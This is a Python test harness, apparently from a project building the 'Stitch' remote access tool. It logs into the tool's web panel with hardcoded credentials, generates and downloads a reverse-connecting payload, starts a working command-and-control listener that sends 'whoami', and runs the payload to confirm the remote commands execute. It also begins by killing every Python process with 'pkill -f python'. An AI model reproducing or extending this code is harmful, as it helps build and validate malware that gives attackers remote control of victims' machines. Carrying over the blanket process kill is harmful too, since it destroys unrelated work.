#!/usr/bin/env python3
"""
FINAL COMPLETE USER TEST
Test the entire system as a real user would use it
With all fixes applied
"""

import os
import sys
import subprocess
import time
import socket
import requests
import threading

sys.path.insert(0, '/workspace')

def clean_start():
    """Clean all processes for fresh start"""
    print("[*] Clean start...")
    os.system("pkill -f python 2>/dev/null")
    time.sleep(2)

def test_complete_flow():
    """Test complete user flow"""
    
    print("\n" + "="*70)
    print("FINAL USER EXPERIENCE TEST")
    print("="*70)
    
    results = []
    
    # 1. Start web interface
    print("\n[1] Starting Web Interface...")
    
    web_script = '''
import sys, os
sys.path.insert(0, '/workspace')
os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'test123'

from werkzeug.security import generate_password_hash
import web_app_real
web_app_real.USERS = {'admin': generate_password_hash('test123')}

from web_app_real import app, socketio
socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
'''
    
    with open('/tmp/web.py', 'w') as f:
        f.write(web_script)
        
    web_proc = subprocess.Popen(['python3', '/tmp/web.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    
    # 2. Login
    print("[2] Logging in...")
    
    session = requests.Session()
    resp = session.get('http://localhost:5000/login')
    
    import re
    csrf = re.search(r'csrf_token.*?value="([^"]+)"', resp.text).group(1)
    
    resp = session.post('http://localhost:5000/login', data={
        'username': 'admin',
        'password': 'test123',
        'csrf_token': csrf
    })
    
    if resp.status_code in [302, 303]:
        print("  ✓ Logged in")
        results.append("Login: SUCCESS")
    else:
        print("  ✗ Login failed")
        results.append("Login: FAILED")
        
    # Get API CSRF
    resp = session.get('http://localhost:5000/')
    api_csrf = re.search(r'csrf-token.*?content="([^"]+)"', resp.text).group(1) if 'csrf-token' in resp.text else csrf
    
    # 3. Generate payload
    print("[3] Generating payload...")
    
    resp = session.post('http://localhost:5000/api/generate-payload', 
                        json={'platform': 'linux', 'host': '127.0.0.1', 'port': '8888'},
                        headers={'X-CSRFToken': api_csrf})
    
    if resp.status_code == 200:
        print("  ✓ Payload generated")
        results.append("Generate: SUCCESS")
        
        # 4. Download payload
        print("[4] Downloading payload...")
        
        dl_resp = session.get('http://localhost:5000/api/download-payload')
        
        payload_path = '/tmp/test_payload'
        if 'python' in dl_resp.headers.get('Content-Type', '').lower():
            payload_path += '.py'
            
        with open(payload_path, 'wb') as f:
            f.write(dl_resp.content)
            
        print(f"  ✓ Downloaded ({len(dl_resp.content):,} bytes)")
        results.append(f"Download: SUCCESS ({len(dl_resp.content)} bytes)")
        
        # 5. Start C2 server
        print("[5] Starting C2 server...")
        
        c2_script = '''
import socket, threading
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 8888))
s.listen(1)
print("C2 listening on 8888")

def handle(c, a):
    print(f"Connection from {a}")
    while True:
        try:
            c.send(b'whoami\\n')
            r = c.recv(1024)
            if r:
                print(f"Response: {r.decode()[:50]}")
                break
        except:
            break
    c.close()

while True:
    c, a = s.accept()
    threading.Thread(target=handle, args=(c,a), daemon=True).start()
'''
        
        with open('/tmp/c2.py', 'w') as f:
            f.write(c2_script)
            
        c2_proc = subprocess.Popen(['python3', '/tmp/c2.py'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
        time.sleep(2)
        
        # 6. Run payload
        print("[6] Running payload...")
        
        # Make executable
        os.chmod(payload_path, 0o755)
        
        # Determine how to run
        with open(payload_path, 'rb') as f:
            header = f.read(4)
            
        if header.startswith(b'\\x7fELF'):
            cmd = [payload_path]
            print("  Running as binary...")
        else:
            cmd = ['python3', payload_path]
            print("  Running as Python...")
            
        payload_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
        time.sleep(3)
        
        # 7. Check if connected
        print("[7] Checking connection...")
        
        if payload_proc.poll() is None:
            print("  ✓ Payload running")
            results.append("Payload: RUNNING")
            
            # Check C2 output
            try:
                output = c2_proc.stdout.readline()
                if 'Connection' in output:
                    print(f"  ✓ Connected: {output.strip()}")
                    results.append("Connection: SUCCESS")
                    
                    # Read response
                    output = c2_proc.stdout.readline()
                    if output:
                        print(f"  ✓ Command executed: {output.strip()}")
                        results.append("Commands: SUCCESS")
            except:
                pass
        else:
            stderr = payload_proc.stderr.read()
            print(f"  ✗ Payload crashed: {stderr[:100]}")
            results.append(f"Payload: CRASHED")
    else:
        print(f"  ✗ Generation failed: {resp.status_code}")
        results.append("Generate: FAILED")
        
    # Cleanup
    try:
        web_proc.terminate()
        c2_proc.terminate()
        payload_proc.terminate()
    except:
        pass
        
    # Report
    print("\n" + "="*70)
    print("RESULTS")
    print("="*70)
    
    for result in results:
        status = "✓" if "SUCCESS" in result or "RUNNING" in result else "✗"
        print(f"  {status} {result}")
        
    success_count = sum(1 for r in results if "SUCCESS" in r or "RUNNING" in r)
    total = len(results)
    
    print(f"\n[SCORE] {success_count}/{total}")
    
    if success_count == total:
        print("\n✅ PERFECT - Everything works end-to-end!")
    elif success_count >= total - 1:
        print("\n✅ EXCELLENT - System fully functional!")
    elif success_count >= total/2:
        print("\n⚠️ PARTIAL - Some issues remain")
    else:
        print("\n❌ FAILED - Major issues")

def main():
    clean_start()
    test_complete_flow()

if __name__ == "__main__":
    main()